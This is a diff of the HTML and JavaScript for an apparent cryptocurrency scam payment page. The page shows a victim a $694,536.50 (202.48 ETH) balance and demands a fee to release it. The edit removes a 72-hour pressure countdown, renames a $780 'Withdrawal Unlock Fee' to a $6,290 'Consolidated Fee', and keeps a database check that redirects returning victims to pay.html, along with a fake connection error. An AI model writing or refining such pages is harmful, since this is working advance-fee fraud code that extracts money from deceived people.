@@ -17,7 +17,6 @@
        .summary-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
        .summary-item:last-child { margin-bottom: 0; }
        .highlight { color: #34d399; font-weight: 600; }
-       .timer { font-size: 28px; font-weight: 700; color: #ef4444; margin: 20px 0; letter-spacing: 1px; }
        .error-message { display: none; background-color: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; text-align: left; line-height: 1.4; }
        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30, 41, 59, 0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
@@ -36,7 +35,7 @@
 
    <div>
        <h2>Payment Details</h2>
-       <p>Review the transaction details and complete the required network fee payment before the timer expires.</p>
+       <p>Review the transaction details and complete the required payment to proceed.</p>
 
        <div class="error-message" id="error-box"></div>
 
@@ -50,13 +49,10 @@
                <span class="highlight">$694,536.50 (202.48 ETH)</span>
            </div>
            <div class="summary-item">
-               <span>Withdrawal Unlock Fee:</span>
-               <span style="color: #ef4444; font-weight: 600;">$780.00</span>
+               <span>Consolidated Fee:</span>
+               <span style="color: #ef4444; font-weight: 600;">$6,290.00</span>
            </div>
        </div>
-
-       <p style="margin-bottom: 5px;">Time remaining to complete payment:</p>
-       <div class="timer" id="countdown">72:00:00</div>
 
        <button class="btn" style="background-color: #10b981;" onclick="triggerPaymentProcessing()">Pay Now</button>
    </div>
@@ -83,35 +79,7 @@
        }, 2000);
    }
 
-   function startRealtimeTimer(targetExpirationTimestamp) {
-       const display = document.getElementById('countdown');
-       const targetTime = parseInt(targetExpirationTimestamp, 10);
-
-       if (window.timerInterval) clearInterval(window.timerInterval);
-
-       window.timerInterval = setInterval(function () {
-           const now = Date.now();
-           const distance = targetTime - now;
-
-           if (distance <= 0) {
-               clearInterval(window.timerInterval);
-               display.textContent = "EXPIRED";
-               showError("Time has expired! Please contact support.");
-               return;
-           }
-
-           let hours = Math.floor(distance / (1000 * 60 * 60));
-           let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-           let seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-           display.textContent =
-               (hours < 10 ? "0" + hours : hours) + ":" +
-               (minutes < 10 ? "0" + minutes : minutes) + ":" +
-               (seconds < 10 ? "0" + seconds : seconds);
-       }, 1000);
-   }
-
-   async function syncTimerSession() {
+   async function syncSession() {
        const wallet = localStorage.getItem('active_wallet');
 
        if (!wallet) {
@@ -125,7 +93,7 @@
        try {
            const { data, error } = await supabaseClient
                .from('crypto_transfers')
-               .select('id, expires_at, is_blocked')
+               .select('id, is_blocked')
                .eq('wallet_address', wallet)
                .limit(1);
 
@@ -136,35 +104,10 @@
                return;
            }
 
-           const row = data[0];
-
-           // Already been to pay.html before — send them straight back
-           if (row.is_blocked) {
+           if (data[0].is_blocked) {
                window.location.replace("pay.html");
                return;
            }
-
-           let expiry = row.expires_at;
-
-           if (!expiry || expiry === "null" || expiry.trim() === "") {
-               const finalTargetTimestamp = Date.now() + (72 * 60 * 60 * 1000);
-               expiry = finalTargetTimestamp.toString();
-
-               const { error: updateError } = await supabaseClient
-                   .from('crypto_transfers')
-                   .update({ expires_at: expiry })
-                   .eq('id', row.id);
-
-               if (updateError) throw updateError;
-           }
-
-           const parsed = parseInt(expiry, 10);
-           if (isNaN(parsed)) {
-               throw new Error("Invalid expiry value in database: " + expiry);
-           }
-
-           startRealtimeTimer(parsed);
-
        } catch (err) {
            console.error("Full error:", err);
            showError("Cloud Synchronizer Connection Failed.");
@@ -173,7 +116,7 @@
        }
    }
 
-   window.onload = syncTimerSession;
+   window.onload = syncSession;
 </script>
 </body>
 </html>
